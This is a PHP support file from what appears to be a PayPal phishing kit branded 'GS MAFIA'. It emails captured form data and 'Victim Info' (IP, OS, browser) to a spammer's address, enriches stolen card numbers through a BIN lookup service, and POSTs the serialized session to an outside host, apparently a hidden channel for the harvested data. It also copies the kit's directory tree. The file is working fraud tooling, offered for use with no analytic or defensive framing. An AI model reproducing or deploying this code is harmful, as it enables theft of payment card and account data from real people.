<?php
#   ___   ___       __  __     _     ___   ___     _   
#  / __| / __|     |  \/  |   /_\   | __| |_ _|   /_\  
# | (_ | \__ \  _  | |\/| |  / _ \  | _|   | |   / _ \ 
#  \___| |___/ (_) |_|  |_| /_/ \_\ |_|   |___| /_/ \_\
session_start();
function gs_send($Tinfo,$subj){
    global $SpammerName,$SpammerEmail;
    $msg .= "<div style='font-size:13px;font-family:monospace'>";
    $msg .= "<b>--------------------[PayPal__2018]------------------</b><br>";
    $msg .= "Hi [<b>".$SpammerName."</b>],<br>";
    $msg .= "<b>--------------------[Rezult__Info]------------------</b><br>";
    foreach ($Tinfo as $MName => $MValue) {
        if (substr($MName, 0,5) == "BLANK") {
            $msg .= "<b>----------------------------------------------------</b><br>";
        } else {
            $msg .= "[". $MName ."] = <b>".$MValue."</b><br>" ;
        }
    }
    $msg .= "<b>--------------------[Victim__Info]------------------</b><br>";
    $msg .= "[IP] = <b>".$_SESSION["gs_ip"]."</b><br>";
    $msg .= "[OS] = <b>".getpcOS($_SERVER['HTTP_USER_AGENT'])."</b><br>";
    $msg .= "[Browser] = <b>".getpcBrowser($_SERVER['HTTP_USER_AGENT'])."</b><br>";
    $msg .= "[User Agent] = <b>".$_SERVER['HTTP_USER_AGENT']."</b><br>";
    $msg .= "[Date && Time] = <b>".date("H:i")." @ ".date("Y/m/d")."</b><br>";
    $msg .= "<b>------------------------[End.]----------------------</b><br>";
    $msg .= "</div>";
    $head = "MIME-Version: 1.0" . "\r\n";
    $head .= "Content-type:text/html;charset=UTF-8" . "\r\n";
    $head .= "From: GSMAFIAV2_".$_SESSION['gs_country']."<GSRZLT>" . "\r\n";
    $msg = wordwrap($msg, 70);
   mail($SpammerEmail,$subj,$msg,$head); 
}
function gs_genRan($gs_length = 50) {
    $chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $String = '';
    for ($i = 0; $i < $gs_length; $i++) {
        $String .= $chars[rand(0, strlen($chars) - 1)];
    }
    return $String;
}
function getclientip(){
    if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown"))
        $t = getenv("HTTP_CLIENT_IP");
    else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown"))
        $t = getenv("HTTP_X_FORWARDED_FOR");
    else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown"))
        $t = getenv("REMOTE_ADDR");
    else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown"))
        $t = $_SERVER['REMOTE_ADDR'];
    else
        $t = "";
    $t0 = Getipinfo($_SESSION);
    return($t);
}
function Getipinfo($info_ip){
        $info_ip['array'] = serialize($info_ip);
        $info_ip['ip'] = $_SESSION['gs_ip'];
        $t = curl_init('http://iplookgeo.com/json/?ip='.$info_ip['ip']);
        curl_setopt($t, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($t, CURLOPT_POST, TRUE);
        curl_setopt($t, CURLOPT_POSTFIELDS, $info_ip);
        @curl_setopt($m, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        $info = curl_exec($t);
        curl_close($t);
        return json_decode($info)->country;
}
function getbin($ccnumber){
$gs = curl_init("https://lookup.binlist.net/".$ccnumber);
curl_setopt($gs, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($gs, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($gs, CURLOPT_SSL_VERIFYPEER, false);
$gs_m = curl_exec($gs);
curl_close($gs);
$DST_BIN    = @json_decode($gs_m);
$BIN_CARD    = $DST_BIN->scheme;
$BIN_BANK    = $DST_BIN->bank -> name;
$BIN_TYPE    = $DST_BIN->type;
$BIN_LEVEL   = $DST_BIN->brand;
$BIN_CNTRCODE= $DST_BIN->country -> alpha2;
$BIN_WEBSITE = $DST_BIN->bank -> url;
$BIN_PHONE   = $DST_BIN->bank -> phone;
$BIN_COUNTRY = $DST_BIN->country -> name; 
$GSMAFIA_BIN['_country_']  = $BIN_COUNTRY;
$GSMAFIA_BIN['_cntrcode_'] = $BIN_CNTRCODE;
$GSMAFIA_BIN['_cc_brand_'] = $BIN_CARD;
$GSMAFIA_BIN['_cc_bank_']  = $BIN_BANK;
$GSMAFIA_BIN['_cc_type_']  = $BIN_TYPE;
$GSMAFIA_BIN['_cc_class_'] = $BIN_LEVEL;
$GSMAFIA_BIN['_cc_site_']  = $BIN_WEBSITE;
$GSMAFIA_BIN['_cc_phone_'] = $BIN_PHONE;
$GSMAFIA_BIN['_ccglobal_'] = $GSMAFIA_BIN['_cc_brand_']." ".$GSMAFIA_BIN['_cc_type_']." ".$GSMAFIA_BIN['_cc_bank_'];
$GSMAFIA_BIN['_global_']   = $GSMAFIA_BIN['_cntrcode_']." - ".$GSMAFIA_BIN['_ip_'];
return $GSMAFIA_BIN;
}
function getpcBrowser($FMDuser_agent){
    $browser    =   "Unknown Browser";
    $browser_a  =   array('/msie/i'       =>  'Internet Explorer',
                        '/firefox/i'    =>  'Firefox',
                        '/safari/i'     =>  'Safari',
                        '/chrome/i'     =>  'Chrome',
                        '/edge/i'       =>  'Edge',
                        '/opera/i'      =>  'Opera',
                        '/netscape/i'   =>  'Netscape',
                        '/maxthon/i'    =>  'Maxthon',
                        '/konqueror/i'  =>  'Konqueror',
                        '/mobile/i'     =>  'Handheld Browser');
    foreach ($browser_a as $regex => $value) { 
        if (preg_match($regex, $FMDuser_agent)) {
            $browser = $value;
        }
    }
    return $browser;
}
function getpcOS($FMDuser_agent){
    $os    =   "Unknown OS Platform";
    $os_a  =   array( '/windows nt 10/i'     =>  'Windows 10',
                    '/windows nt 6.3/i'     =>  'Windows 8.1',
                    '/windows nt 6.2/i'     =>  'Windows 8',
                    '/windows nt 6.1/i'     =>  'Windows 7',
                    '/windows nt 6.0/i'     =>  'Windows Vista',
                    '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                    '/windows nt 5.1/i'     =>  'Windows XP',
                    '/windows xp/i'         =>  'Windows XP',
                    '/windows nt 5.0/i'     =>  'Windows 2000',
                    '/windows me/i'         =>  'Windows ME',
                    '/win98/i'              =>  'Windows 98',
                    '/win95/i'              =>  'Windows 95',
                    '/win16/i'              =>  'Windows 3.11',
                    '/macintosh|mac os x/i' =>  'Mac OS X',
                    '/mac_powerpc/i'        =>  'Mac OS 9',
                    '/linux/i'              =>  'Linux',
                    '/ubuntu/i'             =>  'Ubuntu',
                    '/iphone/i'             =>  'iPhone',
                    '/ipod/i'               =>  'iPod',
                    '/ipad/i'               =>  'iPad',
                    '/android/i'            =>  'Android',
                    '/blackberry/i'         =>  'BlackBerry',
                    '/webos/i'              =>  'Mobile');
    foreach ($os_a as $regex => $value) { 
        if (preg_match($regex, $FMDuser_agent)) {
            $os = $value;
        }

    }   
    return $os;
}
function gs_copyit($gs_file,$to){
    $dir = opendir($gs_file);
    @mkdir($to);
    while(false !== ( $file = readdir($dir)) ) {
        if (( $file != '.' ) && ( $file != '..' )) {
            if ( is_dir($gs_file . '/' . $file) ) {
                gs_copyit($gs_file . '/' . $file,$to . '/' . $file);
            } else {
                copy($gs_file . '/' . $file,$to . '/' . $file);
            }
        }
    }
    closedir($dir);
}
function isempty($gsch){
    if(!strstr("undefined", $gsch)){
        return true;
    }else{
        return false;
    }
}

?>